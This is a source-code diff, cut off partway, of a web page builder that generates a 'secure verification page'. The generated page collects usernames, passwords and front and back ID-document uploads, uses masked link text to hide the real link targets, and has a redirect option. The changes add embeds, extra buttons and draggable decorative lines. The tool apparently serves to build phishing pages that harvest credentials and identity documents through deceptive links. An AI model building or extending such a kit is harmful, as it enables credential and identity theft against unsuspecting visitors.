@@ -15,6 +15,7 @@
   height: 75vh;
   overflow: visible;
   width: 100%;
+  user-select: none;
 }
 
 /* ===============================
@@ -98,6 +99,24 @@
   .wrap > div {
     flex: 1 1 100%;
   }
+}
+
+/* ===============================
+   GENERATE FORM BUTTON
+   =============================== */
+#generateFormButton {
+  background-color: #1976d2; /* Blue */
+  color: #fff;               /* White text */
+  border: none;
+  padding: 12px 20px;
+  border-radius: 8px;
+  cursor: pointer;
+  font-size: 16px;
+  transition: background 0.3s;
+}
+
+#generateFormButton:hover {
+  background-color: #115293; /* Darker blue on hover */
 }
 </style>
 
@@ -196,6 +215,24 @@ Welcome to our secure verification page. Please provide your details below to en
   <textarea id="videoLinks"></textarea>
 </div>
 
+<div class="section">
+  <h3>🔗 Embed Links</h3>
+
+  <label><input type="checkbox" id="embedShow" checked> Enable Embeds</label>
+
+  <label>Title</label>
+  <input id="embedText">
+
+  <label>Embed URL</label>
+  <input id="embedURL">
+
+  <label>Description</label>
+  <textarea id="embedDesc"></textarea>
+
+  <button onclick="addEmbedLink()">Add Embed</button>
+  <button onclick="clearEmbedLinks()">Clear Embeds</button>
+</div>
+
 <!-- FORM -->
 <div class="section">
   <h3>🔐 Form Fields</h3>
@@ -283,15 +320,96 @@ Welcome to our secure verification page. Please provide your details below to en
 <!-- BUTTONS -->
 <div class="section">
   <h3>🚀 Buttons</h3>
-  <label>Main Button Text</label>
-  <input id="buttonText"value="Submit">
 
-  <label><input type="checkbox" id="showMainBtn" checked> Show Main Button</label>
+  <!-- existing button controls here -->
+
+  <label>
+    <input type="checkbox" id="showGenerateBtn" checked>
+    Show Generate Button
+  </label>
 
   <label>Generate Button Text</label>
-  <input id="generateBtnText"value="Generate Code">
+  <input id="generateBtnText" value="Generate">
+</div>
+  <label>Main Button Text</label>
+  <input id="buttonText" value="Submit">
 
-  <label><input type="checkbox" id="showGenerateBtn" checked> Show Generate Button</label>
+  <label><input type="checkbox" id="showMainBtn" checked> Show Main Button</label>
+</div>
+
+<!-- Extra Buttons -->
+<div class="section">
+  <h3>➕ Extra Buttons</h3>
+
+  <p style="font-size:13px;color:#555;margin:6px 0 12px;">
+    Add additional custom buttons anywhere on the page.
+    Use these for external links, actions, promotions, or important navigation.
+    You can control the button text, link, color, size, and visibility.
+  </p>
+
+<label>Button Alignment</label>
+<select id="newBtnAlign">
+  <option value="left">Left</option>
+  <option value="center" selected>Center</option>
+  <option value="right">Right</option>
+</select>
+
+  <label>Text: <input id="newBtnText" value="Click Me"></label>
+  <label>Link URL: <input id="newBtnLink" value="https://example.com"></label>
+  <label>Color: <input type="color" id="newBtnColor" value="#1976d2"></label>
+  <label>Size (px): <input type="number" id="newBtnSize" value="44" min="20" max="200"></label>
+  <label>Show Button: <input type="checkbox" id="newBtnShow" checked></label>
+  <button onclick="addExtraButton()">Add Extra Button</button>
+  <button onclick="clearExtraButtons()">Clear All Extra Buttons</button>
+</div>
+
+<!-- Draggable Lines -->
+<div class="section">
+  <h3>➖ Draggable Lines</h3>
+
+  <label>Line Type</label>
+  <select id="linePreset">
+    <optgroup label="Basic Geometric & Orientation">
+      <option value="straight">Straight Line</option>
+      <option value="horizontal">Horizontal Line</option>
+      <option value="vertical">Vertical Line</option>
+      <option value="diagonal">Diagonal Line</option>
+      <option value="curved">Curved Line</option>
+      <option value="zigzag">Zigzag Line</option>
+      <option value="wavy">Wavy Line</option>
+    </optgroup>
+
+    <optgroup label="Patterned & Stylized">
+      <option value="solid">Solid Line</option>
+      <option value="dashed">Dashed Line</option>
+      <option value="dotted">Dotted Line</option>
+      <option value="thick">Thick Line</option>
+      <option value="thin">Thin Line</option>
+    </optgroup>
+
+    <optgroup label="Directional & Design">
+      <option value="arrow">Directional Line</option>
+      <option value="spiral">Spiral Line</option>
+      <option value="flow">Flowing Line</option>
+      <option value="leading">Leading Line</option>
+    </optgroup>
+
+    <optgroup label="Artistic">
+      <option value="expressive">Expressive Line</option>
+      <option value="contour">Contour Line</option>
+      <option value="hatching">Hatching Lines</option>
+      <option value="crosshatch">Cross-Hatching</option>
+    </optgroup>
+  </select>
+
+  <label>Color</label>
+  <input type="color" id="lineColor" value="#000000">
+
+  <label>Thickness</label>
+  <input type="number" id="lineSize" value="2" min="1" max="12">
+  <button onclick="addLine()">➕ Add Line</button>
+
+<div id="linesList"></div>
 </div>
 
 <!-- REDIRECT -->
@@ -307,9 +425,10 @@ Welcome to our secure verification page. Please provide your details below to en
   <input id="footerText" value="© 2025 Your Company. All rights reserved.">
 </div>
 
+<!-- Generate Form -->
 <div class="section">
-  <button onclick="generateForm()">Generate form</button>
-  <div id="linkArea" class="linkBox" style="display:none"></div>
+  <button id="generateFormButton" onclick="generateForm()">Generate Form</button>
+  <div id="linkArea" class="linkBox" style="display:none; margin-top:10px;"></div>
 </div>
 
 </div>
@@ -324,12 +443,135 @@ Welcome to our secure verification page. Please provide your details below to en
 
 </div>
 </div>
-
+<script src="https://www.youtube.com/iframe_api"></script>
 <script>
 const $ = id => document.getElementById(id);
 
-// Arrays to store dynamic elements
-let extraButtons = [], embedLinks = [], customFields = [], dragging = null, dx = 0, dy = 0;
+let ytApiReady = false;
+
+window.onYouTubeIframeAPIReady = function () {
+  ytApiReady = true;
+  renderPreview();
+};
+
+// -------------------------
+// Draggable Lines & Extra Buttons
+// -------------------------
+let draggableItems = []; // store extra buttons + lines
+
+const linePresets = {
+  straight: "────────────",
+  horizontal: "────────────",
+  vertical: "││││││││││││",
+  diagonal: "///////////",
+  curved: "~~~~~~~~~~~~",
+  zigzag: "⚡⚡⚡⚡⚡⚡",
+  wavy: "〰〰〰〰〰〰",
+
+  solid: "━━━━━━━━━━━━",
+  dashed: "— — — — — —",
+  dotted: "· · · · · ·",
+  thick: "████████████",
+  thin: "────────────",
+
+  arrow: "➜➜➜➜➜➜",
+  spiral: "🌀🌀🌀",
+  flow: "≈≈≈≈≈≈",
+  leading: "➝➝➝➝➝",
+
+  expressive: "✦✦✦✦✦",
+  contour: "▭▭▭▭▭",
+  hatching: "//// ////",
+  crosshatch: "#### ####"
+};
+
+// -------------------------
+// Dynamic Storage Arrays
+// -------------------------
+let extraButtons = [],
+    embedLinks = [],
+    customFields = [],
+    dragging = null,
+    dx = 0,
+    dy = 0;
+    
+    // -------------------------
+// GLOBAL DRAG MOVE HANDLER
+// -------------------------
+document.onmousemove = e => {
+  if (!dragging) return;
+
+  const preview = document.getElementById("preview");
+  if (!preview) return;
+
+  const rect = preview.getBoundingClientRect();
+  dragging.x = ((e.clientX - rect.left - dx) / rect.width) * 100;
+  dragging.y = ((e.clientY - rect.top - dy) / rect.height) * 100;
+
+  renderPreview();
+};
+
+document.onmouseup = () => dragging = null;
+
+// -------------------------
+// CUSTOM FORM FIELDS (ADMIN UI)
+// -------------------------
+function renderCustomFields() {
+  const wrap = $("customFieldsWrap");
+  if (!wrap) return;
+
+  wrap.innerHTML = "";
+
+  customFields.forEach((fld, i) => {
+    const div = document.createElement("div");
+    div.style.border = "1px solid #ccc";
+    div.style.padding = "10px";
+    div.style.marginTop = "8px";
+    div.style.borderRadius = "8px";
+    div.style.background = "#fafafa";
+
+    div.innerHTML = `
+      <label>Field Label</label>
+      <input value="${fld.label}"
+        oninput="customFields[${i}].label=this.value; renderPreview()">
+
+      <label>Type</label>
+      <select onchange="customFields[${i}].type=this.value; renderPreview()">
+        <option value="text" ${fld.type==="text"?"selected":""}>Text</option>
+        <option value="number" ${fld.type==="number"?"selected":""}>Number</option>
+        <option value="email" ${fld.type==="email"?"selected":""}>Email</option>
+        <option value="password" ${fld.type==="password"?"selected":""}>Password</option>
+      </select>
+
+      <button
+        style="margin-top:8px;background:#c62828;color:#fff;border:none;
+               padding:6px 10px;border-radius:6px;cursor:pointer"
+        onclick="deleteCustomField(${i})">
+        ❌ Delete This Field
+      </button>
+    `;
+
+    wrap.appendChild(div);
+  });
+}
+
+function addCustomField() {
+  customFields.push({ label: "New Field", type: "text" });
+  renderCustomFields();
+  renderPreview();
+}
+
+function deleteCustomField(index) {
+  customFields.splice(index, 1);
+  renderCustomFields();
+  renderPreview();
+}
+
+function clearCustomFields() {
+  customFields = [];
+  renderCustomFields();
+  renderPreview();
+}
 
 // -------------------------
 // Update SEO & OG Meta Tags
@@ -347,7 +589,7 @@ function updateSEOMeta() {
   }
   metaDesc.content = $("metaDesc").value;
 
-  // Open Graph Image
+  // OG Image
   let ogImage = document.querySelector('meta[property="og:image"]');
   if (!ogImage) {
     ogImage = document.createElement("meta");
@@ -373,35 +615,6 @@ function updateSEOMeta() {
     document.head.appendChild(ogDesc);
   }
   ogDesc.content = $("metaDesc").value;
-}
-
-// -------------------------
-// Custom Fields
-// -------------------------
-function addCustomField() {
-  customFields.push({ label: "New Field", type: "text" });
-  renderCustomFields();
-  renderPreview();
-}
-function clearCustomFields() { customFields.length=0; renderCustomFields(); renderPreview(); }
-function renderCustomFields(){
-  const wrap=$("customFieldsWrap"); wrap.innerHTML="";
-  customFields.forEach((fld,i)=>{
-    const div=document.createElement("div");
-    div.style.border="1px solid #ccc"; div.style.padding="8px"; div.style.marginTop="6px"; div.style.borderRadius="6px";
-    div.innerHTML=`
-      <label>Field Label</label>
-      <input value="${fld.label}" oninput="customFields[${i}].label=this.value; renderPreview()">
-      <label>Type</label>
-      <select onchange="customFields[${i}].type=this.value; renderPreview()">
-        <option value="text" ${fld.type==="text"?"selected":""}>Text</option>
-        <option value="number" ${fld.type==="number"?"selected":""}>Number</option>
-        <option value="email" ${fld.type==="email"?"selected":""}>Email</option>
-        <option value="password" ${fld.type==="password"?"selected":""}>Password</option>
-      </select>
-    `;
-    wrap.appendChild(div);
-  });
 }
 
 // Default example gallery items
@@ -447,42 +660,41 @@ function clearGalleryItems() {
 
 function renderGalleryInputs() {
   const wrap = $("galleryItemsWrap");
+  if (!wrap) return;
+
   wrap.innerHTML = "";
 
-  galleryItems.forEach((g, i) => {
+  galleryItems.forEach((item, i) => {
     const div = document.createElement("div");
     div.style.border = "1px solid #ccc";
-    div.style.padding = "12px";
-    div.style.marginBottom = "12px";
-    div.style.borderRadius = "10px";
+    div.style.padding = "10px";
+    div.style.marginTop = "8px";
+    div.style.borderRadius = "8px";
     div.style.background = "#fafafa";
 
     div.innerHTML = `
       <label>Image URL</label>
-      <input value="${g.img}" oninput="galleryItems[${i}].img=this.value; renderPreview()">
+      <input value="${item.img}"
+        oninput="galleryItems[${i}].img=this.value; renderPreview()">
 
-      <label>Real Link (hidden)</label>
-      <input value="${g.link}" oninput="galleryItems[${i}].link=this.value; renderPreview()">
+      <label>Masked Text</label>
+      <input value="${item.mask}"
+        oninput="galleryItems[${i}].mask=this.value; renderPreview()">
 
-      <label>Masked Link Text</label>
-      <input value="${g.mask}" oninput="galleryItems[${i}].mask=this.value; renderPreview()">
+      <label>Link URL</label>
+      <input value="${item.link}"
+        oninput="galleryItems[${i}].link=this.value; renderPreview()">
 
       <label>Description</label>
-      <textarea rows="3" oninput="galleryItems[${i}].desc=this.value; renderPreview()">${g.desc}</textarea>
-
-      <label>Link Alignment</label>
-      <select onchange="galleryItems[${i}].linkAlign=this.value; renderPreview()">
-        <option value="top" ${g.linkAlign==='top'?'selected':''}>Top</option>
-        <option value="bottom" ${!g.linkAlign || g.linkAlign==='bottom'?'selected':''}>Bottom</option>
-        <option value="left" ${g.linkAlign==='left'?'selected':''}>Left</option>
-        <option value="center" ${g.linkAlign==='center'?'selected':''}>Center</option>
-        <option value="right" ${g.linkAlign==='right'?'selected':''}>Right</option>
-      </select>
+      <textarea
+        oninput="galleryItems[${i}].desc=this.value; renderPreview()"
+      >${item.desc || ""}</textarea>
 
       <button
-        style="background:#c62828;color:#fff;margin-top:10px"
+        style="margin-top:8px;background:#c62828;color:#fff;border:none;
+               padding:6px 10px;border-radius:6px;cursor:pointer"
         onclick="deleteGalleryItem(${i})">
-        ❌ Delete This Item
+        ❌ Delete Gallery Item
       </button>
     `;
 
@@ -490,122 +702,93 @@ function renderGalleryInputs() {
   });
 }
 
-// -------------------------
-// Extra Buttons
-// -------------------------
-function addExtraButton(){
-  if(!$("newBtnShow").checked) return;
-  extraButtons.push({
-    id:"b"+Math.random().toString(36).slice(2),
-    text:$("newBtnText").value, link:$("newBtnLink").value,
-    color:$("newBtnColor").value, size:parseInt($("newBtnSize").value)||44,
-    x:40,y:60, show:$("newBtnShow").checked
-  }); renderPreview();
+function addLine() {
+  const presetKey = $("linePreset")?.value;
+  const presetText = linePresets[presetKey] || "────────";
+
+  draggableItems.push({
+    id: "l" + Math.random().toString(36).slice(2),
+    text: presetText,
+    color: $("lineColor")?.value || "#000",
+    size: parseInt($("lineSize")?.value) || 2,
+    x: 50,
+    y: 50,
+    align: "center",
+    show: true
+  });
+
+  renderLinesList();   // ✅ REQUIRED
+  renderPreview();
 }
-function clearExtraButtons(){ extraButtons=[]; renderPreview(); }
 
-// -------------------------
-// Embed Links
-// -------------------------
-function addEmbedLink(){ if(!$("embedShow").checked) return; embedLinks.push({ text:$("embedText").value, url:$("embedURL").value, desc:$("embedDesc").value, show:$("embedShow").checked }); renderPreview(); }
-function clearEmbedLinks(){ embedLinks=[]; renderPreview(); }
+/* =========================
+   Lines Admin List
+========================= */
+function renderLinesList() {
+  const wrap = $("linesList");
+  if (!wrap) return;
 
-// -------------------------
-// Preview
-// -------------------------
+  wrap.innerHTML = "";
+
+  draggableItems.forEach((line, i) => {
+    if (!line.text) return;
+
+    const row = document.createElement("div");
+    row.style.border = "1px solid #ddd";
+    row.style.padding = "8px";
+    row.style.marginTop = "8px";
+    row.style.borderRadius = "8px";
+    row.style.background = "#fafafa";
+
+    row.innerHTML = `
+      <strong>Line ${i + 1}</strong>
+
+      <label style="margin-top:6px;display:block">Alignment</label>
+      <select onchange="draggableItems[${i}].align=this.value; renderPreview()">
+        <option value="left" ${line.align==="left"?"selected":""}>Left</option>
+        <option value="center" ${line.align==="center"?"selected":""}>Center</option>
+        <option value="right" ${line.align==="right"?"selected":""}>Right</option>
+      </select>
+
+      <button
+        style="margin-top:6px;background:#c62828;color:#fff;border:none;
+               padding:6px 10px;border-radius:6px;cursor:pointer"
+        onclick="draggableItems.splice(${i},1); renderLinesList(); renderPreview()">
+        ❌ Delete Line
+      </button>
+    `;
+
+    wrap.appendChild(row);
+  });
+}
+
+// ✅ ADD THESE DIRECTLY UNDER ⬇️
+
+function deleteExtraButton(id) {
+  extraButtons = extraButtons.filter(b => b.id !== id);
+  renderPreview();
+}
+
+function clearExtraButtons() {
+  if (!confirm("Clear all extra buttons?")) return;
+  extraButtons = [];
+  renderPreview();
+}
+
+/* =========================
+   Render Preview
+========================= */
 function renderPreview() {
   try {
-    const p = $("preview");
+    const p = document.getElementById("preview");
+    if (!p) return;
+
     p.innerHTML = "";
     p.style.position = "relative";
-    p.style.minHeight = "520px";
 
-// -------------------------
-// Background Layer
-// -------------------------
-const bgLayer = document.createElement("div");
-bgLayer.style.position = "absolute";
-bgLayer.style.top = 0;
-bgLayer.style.left = 0;
-bgLayer.style.width = "100%";
-bgLayer.style.height = "100%";
-bgLayer.style.zIndex = 0;
-bgLayer.style.overflow = "hidden";
-
-// Add a dedicated container for YouTube API
-const ytContainer = document.createElement("div");
-ytContainer.id = "ytBg";
-ytContainer.style.position = "absolute";
-ytContainer.style.top = "0";
-ytContainer.style.left = "0";
-ytContainer.style.width = "100%";
-ytContainer.style.height = "100%";
-ytContainer.style.zIndex = "-1";
-bgLayer.appendChild(ytContainer);
-
-// Background Image
-const bgImage = $("bgImageURL").value;
-if (bgImage) {
-  const img = document.createElement("img");
-  img.src = bgImage;
-  img.style.width = "100%";
-  img.style.height = "100%";
-  img.style.objectFit = $("bgSize").value || "cover";
-  img.style.position = "absolute";
-  img.style.top = 0;
-  img.style.left = 0;
-  bgLayer.appendChild(img);
-}
-
-// Background Video / YouTube
-const bgVideo = $("bgVideoURL").value;
-if (bgVideo) {
-  if (bgVideo.includes("youtube.com") || bgVideo.includes("youtu.be")) {
-    if (typeof YT !== "undefined" && YT && YT.Player) {
-      let videoId = bgVideo.split("v=")[1] || bgVideo.split("youtu.be/")[1];
-      if (videoId.includes("&")) videoId = videoId.split("&")[0];
-
-      // Remove previous player if exists
-      if (window.ytPlayer) window.ytPlayer.destroy();
-
-      window.ytPlayer = new YT.Player('ytBg', {
-        videoId: videoId,
-        playerVars: { 
-          autoplay: 1, 
-          loop: 1, 
-          playlist: videoId, 
-          mute: 1, 
-          controls: 0, 
-          modestbranding: 1,
-          showinfo: 0,
-          rel: 0
-        },
-        events: { onReady: event => event.target.playVideo() }
-      });
-    }
-  } else {
-    // MP4/WebM support
-    const video = document.createElement("video");
-    video.src = bgVideo;
-    video.autoplay = true;
-    video.loop = true;
-    video.muted = true;
-    video.playsInline = true; 
-    video.style.width = "100%";
-    video.style.height = "100%";
-    video.style.objectFit = "cover";
-    video.style.position = "absolute";
-    video.style.top = 0;
-    video.style.left = 0;
-    video.style.zIndex = "-1";
-    bgLayer.appendChild(video);
-  }
-}
-
-p.appendChild(bgLayer);
-    // -------------------------
-    // Main container
-    // -------------------------
+    /* -------------------------
+       Main container
+    ------------------------- */
     const c = document.createElement("div");
     c.style.position = "relative";
     c.style.zIndex = 1;
@@ -613,8 +796,14 @@ p.appendChild(bgLayer);
     c.style.padding = "16px";
     c.style.color = $("textColor").value || "#222";
     c.style.backgroundColor = $("bgColor").value || "#fff";
+    if ($("bgImageURL").value) {
+    c.style.backgroundImage = `url(${$("bgImageURL").value})`;
+    c.style.backgroundSize = $("bgSize").value;
+    c.style.backgroundRepeat = "no-repeat";
+    c.style.backgroundPosition = "center";
+}
 
-    // Avatar / Logo / Banner
+    /* Avatar / Logo / Banner */
     const addImage = (id, width, round = false, margin = "auto") => {
       const url = $(id).value;
       if (!url) return;
@@ -630,49 +819,47 @@ p.appendChild(bgLayer);
     addImage("logoURL", "140px");
     addImage("bannerURL", "100%", false, "10px auto");
 
-   // Title / Subtitle / Description
-const titleEl = document.createElement("h2");
-titleEl.textContent = $("title").value;
-titleEl.style.textAlign = "center";
-titleEl.style.color = $("titleColor").value || "#000";
-c.appendChild(titleEl);
+    /* Title / Subtitle / Description */
+    const titleEl = document.createElement("h2");
+    titleEl.textContent = $("title").value;
+    titleEl.style.textAlign = "center";
+    titleEl.style.color = $("titleColor").value || "#000";
+    c.appendChild(titleEl);
 
-const subtitleEl = document.createElement("p");
-subtitleEl.textContent = $("subtitle").value;
-subtitleEl.style.textAlign = "center";
-subtitleEl.style.color = $("subtitleColor").value || "#555";
-c.appendChild(subtitleEl);
+    const subtitleEl = document.createElement("p");
+    subtitleEl.textContent = $("subtitle").value;
+    subtitleEl.style.textAlign = "center";
+    subtitleEl.style.color = $("subtitleColor").value || "#555";
+    c.appendChild(subtitleEl);
 
-const descEl = document.createElement("p");
-descEl.textContent = $("description").value;
-c.appendChild(descEl);
+    const descEl = document.createElement("p");
+    descEl.textContent = $("description").value;
+    c.appendChild(descEl);
 
-// -------------------------
-// Gallery Images from Media Section
-// -------------------------
-const galleryImages = $("galleryImages").value.split(",").map(i => i.trim()).filter(Boolean);
-if (galleryImages.length) {
-  const galleryDiv = document.createElement("div");
-  galleryDiv.style.display = "flex";
-  galleryDiv.style.flexWrap = "wrap";
-  galleryDiv.style.gap = "10px";
-  galleryDiv.style.margin = "12px 0";
+    /* Gallery Images */
+    const galleryImages = $("galleryImages").value.split(",").map(i=>i.trim()).filter(Boolean);
+    if (galleryImages.length) {
+      const galleryDiv = document.createElement("div");
+      const layout = $("galleryLayout").value;
+      galleryDiv.style.display = layout === "grid" ? "grid" : "flex";
+      if (layout === "grid") galleryDiv.style.gridTemplateColumns = "repeat(auto-fit, minmax(120px,1fr))";
+      galleryDiv.style.flexWrap = "wrap";
+      galleryDiv.style.gap = "10px";
+      galleryDiv.style.margin = "12px 0";
 
-  galleryImages.forEach(url => {
-    const img = document.createElement("img");
-    img.src = url;
-    img.style.width = "120px";
-    img.style.height = "auto";
-    img.style.borderRadius = "6px";
-    img.style.objectFit = "cover";
-    galleryDiv.appendChild(img);
-  });
+      galleryImages.forEach(url => {
+        const img = document.createElement("img");
+        img.src = url;
+        img.style.width = "120px";
+        img.style.borderRadius = "6px";
+        img.style.objectFit = "cover";
+        galleryDiv.appendChild(img);
+      });
 
-  c.appendChild(galleryDiv);
-}
-    // -------------------------
-    // Warning
-    // -------------------------
+      c.appendChild(galleryDiv);
+    }
+
+    /* Warning */
     if ($("enableWarning").checked && $("warningPosition").value !== "none") {
       const warn = document.createElement("p");
       warn.style.color = "#b71c1c";
@@ -681,214 +868,339 @@ if (galleryImages.length) {
       c.appendChild(warn);
     }
 
-    // -------------------------
-    // Gallery Items
-    // -------------------------
-    const galleryItemsLayout = $("galleryItemsLayout").value || "list";
-    if (galleryItems && galleryItems.length) {
-      const container = document.createElement("div");
-      switch (galleryItemsLayout) {
-        case "grid":
-          container.style.display = "grid";
-          container.style.gridTemplateColumns = "repeat(auto-fit, minmax(120px, 1fr))";
-          container.style.gap = "10px";
-          break;
-        case "large-grid":
-          container.style.display = "grid";
-          container.style.gridTemplateColumns = "repeat(auto-fit, minmax(200px, 1fr))";
-          container.style.gap = "12px";
-          break;
-        case "mix":
-          container.style.display = "grid";
-          container.style.gridTemplateColumns = "repeat(auto-fit, minmax(120px, 1fr))";
-          container.style.gap = "12px";
-          break;
-        default:
-          container.style.display = "flex";
-          container.style.flexDirection = "column";
-          container.style.gap = "12px";
-      }
+ /* =========================
+   Gallery Items (Layout aware)
+========================= */
+if (galleryItems?.length) {
+  const container = document.createElement("div");
+  const layout = $("galleryItemsLayout").value || "list";
 
-      galleryItems.forEach(item => {
-        const wrapper = document.createElement("div");
-        wrapper.style.position = "relative";
-        wrapper.style.marginBottom = "12px";
+  container.style.gap = "12px";
+  container.style.margin = "14px 0";
 
-        const imgEl = document.createElement("img");
-        imgEl.src = item.img;
-        imgEl.style.width = "100%";
-        imgEl.style.borderRadius = "6px";
-        wrapper.appendChild(imgEl);
+  // Reset styles when switching layouts
+  container.style.display = "";
+  container.style.gridTemplateColumns = "";
 
-        const contentEl = document.createElement("div");
-        contentEl.style.marginTop = "6px";
-
-        if (item.link && item.mask) {
-          const linkEl = document.createElement("a");
-          linkEl.href = item.link;
-          linkEl.target = "_blank";
-          linkEl.textContent = item.mask;
-          linkEl.style.textDecoration = "underline";
-          linkEl.style.color = "#1976d2";
-
-          const align = item.linkAlign || "center";
-          if (align === "top") wrapper.insertBefore(linkEl, imgEl);
-          else {
-            contentEl.style.textAlign = ["left","right","center"].includes(align) ? align : "center";
-            contentEl.appendChild(linkEl);
-          }
-        }
-
-        if (item.desc) {
-          const descP = document.createElement("p");
-          descP.textContent = item.desc;
-          descP.style.fontSize = "14px";
-          descP.style.margin = "4px 0 0 0";
-          contentEl.appendChild(descP);
-        }
-
-        wrapper.appendChild(contentEl);
-        container.appendChild(wrapper);
-      });
-
-      c.appendChild(container);
-    }
-
-    // -------------------------
-    // Videos
-    // -------------------------
-    // -------------------------
-// Videos from Media Section
-// -------------------------
-const videoLinks = $("videoLinks").value.split(",").map(v => v.trim()).filter(Boolean);
-
-videoLinks.forEach(link => {
-  let videoEl;
-
-  if (link.endsWith(".mp4") || link.endsWith(".webm")) {
-    // Local / direct video
-    videoEl = document.createElement("video");
-    videoEl.src = link;
-    videoEl.controls = true;
-    videoEl.autoplay = false;
-    videoEl.loop = false;
-    videoEl.muted = false;
-    videoEl.style.width = "100%";
-    videoEl.style.borderRadius = "6px";
-    videoEl.style.margin = "6px 0";
-  } else if (link.includes("youtube.com") || link.includes("youtu.be")) {
-    // YouTube video
-    let videoId = link.includes("youtu.be")
-      ? link.split("youtu.be/")[1]
-      : link.split("v=")[1];
-    if (videoId?.includes("&")) videoId = videoId.split("&")[0];
-
-    if (videoId) {
-      videoEl = document.createElement("iframe");
-      videoEl.src = `https://www.youtube.com/embed/${videoId}?autoplay=0&controls=1&rel=0`;
-      videoEl.width = "100%";
-      videoEl.height = "315";
-      videoEl.frameBorder = "0";
-      videoEl.allow =
-        "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture";
-      videoEl.allowFullscreen = true;
-      videoEl.style.margin = "6px 0";
-    }
+  if (layout === "list") {
+    container.style.display = "flex";
+    container.style.flexDirection = "column";
   }
 
-  if (videoEl) c.appendChild(videoEl);
+  if (layout === "grid") {
+    container.style.display = "grid";
+    container.style.gridTemplateColumns = "repeat(auto-fit, minmax(120px, 1fr))";
+  }
+
+  if (layout === "large-grid") {
+    container.style.display = "grid";
+    container.style.gridTemplateColumns = "repeat(auto-fit, minmax(220px, 1fr))";
+  }
+
+  if (layout === "mix") {
+    container.style.display = "grid";
+    container.style.gridTemplateColumns = "repeat(auto-fit, minmax(160px, 1fr))";
+  }
+
+  galleryItems.forEach((item, i) => {
+  const w = document.createElement("div");
+  w.style.border = "1px solid #ddd";
+  w.style.borderRadius = "8px";
+  w.style.padding = "8px";
+  w.style.background = "#fff";
+
+  // MIX layout: alternate big / small
+  if (layout === "mix" && i % 3 === 0 && window.innerWidth > 600) {
+    w.style.gridColumn = "span 2";
+  }
+
+  /* Image */
+  const img = document.createElement("img");
+  img.src = item.img;
+  img.style.width = "100%";
+  img.style.borderRadius = "6px";
+  w.appendChild(img);
+
+  /* 🔗 MASKED LINK (FIXED) */
+  if (item.link && item.mask) {
+    const a = document.createElement("a");
+    a.href = item.link;
+    a.textContent = item.mask;
+    a.target = "_blank";
+    a.style.display = "block";
+    a.style.margin = "6px 0";
+    a.style.color = "#1976d2";
+    a.style.fontWeight = "600";
+    a.style.textDecoration = "none";
+
+    w.appendChild(a);
+  }
+
+  /* Description */
+  if (item.desc) {
+    const p = document.createElement("p");
+    p.textContent = item.desc;
+    p.style.fontSize = "14px";
+    p.style.opacity = "0.85";
+    w.appendChild(p);
+  }
+
+  container.appendChild(w);
 });
 
-    // -------------------------
-    // Form Fields
-    // -------------------------
-    const fDiv = document.createElement("div");
-    fDiv.style.display = "flex";
-    fDiv.style.flexDirection = "column";
-    fDiv.style.alignItems = $("btnPosition").value==="left"?"flex-start":$("btnPosition").value==="right"?"flex-end":"center";
-    fDiv.style.gap = "8px";
-
-    // Auth
-    if ($("addAuth").checked) {
-      fDiv.innerHTML += `<input placeholder="${$("usernamePlaceholder").value}">`;
-      fDiv.innerHTML += `<input type="password" placeholder="${$("passwordPlaceholder").value}">`;
-    }
-
-    // Extra Fields
-    $("extraFields").value.split("\n").map(f=>f.trim()).filter(Boolean).forEach(f=>{
-      fDiv.innerHTML += `<input placeholder="${f}">`;
+  c.appendChild(container);
+}
+    /* Videos */
+    $("videoLinks").value.split(",").map(v=>v.trim()).filter(Boolean).forEach(link=>{
+      let el;
+      if (link.endsWith(".mp4") || link.endsWith(".webm")) {
+        el=document.createElement("video");
+        el.src=link; el.controls=true;
+      } else if (link.includes("youtu")) {
+        let id=link.split("v=")[1]||link.split("youtu.be/")[1];
+        if(id?.includes("&")) id=id.split("&")[0];
+        if(id){
+          el=document.createElement("iframe");
+          el.src=`https://www.youtube.com/embed/${id}`;
+          el.width="100%"; el.height="315";
+          el.allowFullscreen=true;
+        }
+      }
+      if(el){ el.style.margin="6px 0"; c.appendChild(el); }
     });
+    
+    /* -------------------------
+   Embed Links Preview
+------------------------- */
+if (embedLinks.length) {
+  embedLinks.forEach(e => {
+    if (!e.show) return;
 
-    // Custom Fields
-    customFields.forEach(fld => {
-      const wrapper = document.createElement("div");
-      wrapper.style.display="flex"; wrapper.style.flexDirection="column"; wrapper.style.marginBottom="8px";
-      const input=document.createElement("input");
-      input.type = fld.type;
-      input.placeholder = fld.label;
-      wrapper.appendChild(input);
-      fDiv.appendChild(wrapper);
-    });
+    const box = document.createElement("div");
+    box.style.margin = "12px 0";
 
-    // ID Uploads
-    if ($("chkIdFront").checked || $("chkIdBack").checked) {
-      const idBox = document.createElement("div");
-      idBox.style.padding="10px"; idBox.style.borderRadius="8px"; idBox.style.width="100%"; idBox.style.marginTop="10px";
+    const iframe = document.createElement("iframe");
+    iframe.src = e.url;
+    iframe.width = "100%";
+    iframe.height = "300";
+    iframe.allowFullscreen = true;
 
-      const frontUrl = $("idFrontFile")?.dataset.uploadedUrl;
-      const backUrl  = $("idBackFile")?.dataset.uploadedUrl;
+    box.appendChild(iframe);
 
-      if (frontUrl) { const img=document.createElement("img"); img.src=frontUrl; img.style.width="100%"; img.style.marginTop="6px"; img.style.borderRadius="6px"; idBox.appendChild(img);}
-      if (backUrl) { const img=document.createElement("img"); img.src=backUrl; img.style.width="100%"; img.style.marginTop="6px"; img.style.borderRadius="6px"; idBox.appendChild(img); }
-
-      if ($("chkIdFront").checked) { const lbl=document.createElement("label"); lbl.textContent=$("txtIdFront").value; const inp=document.createElement("input"); inp.type="file"; idBox.appendChild(lbl); idBox.appendChild(inp);}
-      if ($("chkIdBack").checked) { const lbl=document.createElement("label"); lbl.textContent=$("txtIdBack").value; const inp=document.createElement("input"); inp.type="file"; idBox.appendChild(lbl); idBox.appendChild(inp); }
-
-      fDiv.appendChild(idBox);
+    if (e.desc) {
+      const p = document.createElement("p");
+      p.textContent = e.desc;
+      p.style.fontSize = "14px";
+      box.appendChild(p);
     }
 
-    // Buttons
-    if ($("showMainBtn").checked) {
-      const btn=document.createElement("button");
-      btn.style.background=$("btnColor").value; btn.style.color="#fff"; btn.style.padding="10px"; btn.style.border="none"; btn.style.borderRadius="8px";
-      btn.textContent = $("buttonText").value; fDiv.appendChild(btn);
-    }
+    c.appendChild(box);
+  });
+}
 
-    if ($("showGenerateBtn").checked) {
-      const btn=document.createElement("button");
-      btn.style.background="#1976d2"; btn.style.color="#fff"; btn.style.padding="10px"; btn.style.border="none"; btn.style.borderRadius="8px";
